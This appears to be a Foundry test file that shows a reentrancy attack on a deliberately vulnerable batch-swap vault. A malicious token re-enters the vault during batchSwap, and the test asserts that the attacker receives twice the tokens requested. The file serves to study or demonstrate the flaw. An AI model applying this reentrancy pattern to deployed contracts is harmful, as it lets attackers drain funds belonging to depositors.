// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableBatchVault.sol";
import "../src/MaliciousToken.sol";
import "../src/Attacker.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// A simple mock ERC20 token for testing purposes
contract MockToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract BatchReentrancyExploitTest is Test {
    VulnerableBatchVault internal vault;
    MockToken internal legitToken; // A standard, non-malicious token (like WETH)
    MaliciousToken internal maliciousToken; // Our custom malicious token
    Attacker internal attacker;

    address internal user = address(0x1); // A regular user
    address internal attackerAddress = address(0x2); // The attacker's EOA

    function setUp() public {
        // 1. Deploy contracts
        vault = new VulnerableBatchVault();
        legitToken = new MockToken("Legit Token", "LGT");
        maliciousToken = new MaliciousToken();
        
        // Deploy the attacker contract, linking it to the vault and tokens
        attacker = new Attacker(
            address(vault),
            address(maliciousToken),
            address(legitToken)
        );

        // Link the malicious token back to the attacker contract
        maliciousToken.setAttacker(payable(address(attacker)));

        // 2. Fund the user and the vault
        // User gets 100 LGT tokens to start with
        legitToken.mint(user, 100 ether);
        
        // The vault gets 100 MTK (Malicious Tokens) to simulate a liquidity pool
        // First, mint the tokens to the vault's address
        maliciousToken.mint(address(vault), 100 ether);
        // Second, explicitly tell the vault to update its internal balance for the test
        vault.seedBalanceForTesting(maliciousToken, 100 ether);
    }

    function testExploitReentrancy() public {
        // --- SCENARIO ---
        // 1. A normal user deposits 10 LGT into the vault.
        // 2. The attacker, who has no LGT, calls batchSwap to swap 0 LGT for 1 MTK.
        // 3. The malicious token's transfer function re-enters the vault,
        //    allowing the attacker to drain more MTK before the vault's balance is updated.

        // --- SETUP ---
        // User approves the vault to spend their LGT tokens
        vm.startPrank(user);
        legitToken.approve(address(vault), 10 ether);
        // User deposits 10 LGT into the vault
        vault.deposit(legitToken, 10 ether);
        vm.stopPrank();

        // --- ASSERT INITIAL STATE ---
        console.log("--- Before Attack ---");
        console.log("Vault's LGT balance:", vault.balances(address(legitToken)));
        console.log("Vault's MTK balance:", vault.balances(address(maliciousToken)));
        console.log("Attacker's MTK balance:", maliciousToken.balanceOf(address(attacker)));
        assertEq(vault.balances(address(legitToken)), 10 ether);
        assertEq(vault.balances(address(maliciousToken)), 100 ether);
        assertEq(maliciousToken.balanceOf(address(attacker)), 0);

        // --- ATTACK ---
        vm.startPrank(address(attacker));
        // Attacker has no LGT, so they approve 0.
        legitToken.approve(address(vault), 0);
        // Attacker initiates the first call to batchSwap.
        // This will trigger the re-entrancy attack via the malicious token.
        vault.batchSwap(legitToken, maliciousToken, 0, 1 ether);
        vm.stopPrank();

        // --- ASSERT FINAL STATE ---
        console.log("\n--- After Attack ---");
        console.log("Vault's LGT balance:", vault.balances(address(legitToken)));
        console.log("Vault's MTK balance:", vault.balances(address(maliciousToken)));
        console.log("Attacker's MTK balance:", maliciousToken.balanceOf(address(attacker)));

        // VERIFY SUCCESS: The attacker now has 2 MTK tokens, even though they only asked for 1.
        // They got the initial 1 ether, and the re-entrant call gave them another 1 ether.
        assertEq(maliciousToken.balanceOf(address(attacker)), 2 ether);

        // The vault's internal accounting is now wrong. It thinks it has 98 MTK.
        // It correctly recorded subtracting 1 ether twice.
        assertEq(vault.balances(address(maliciousToken)), 98 ether);
    }
}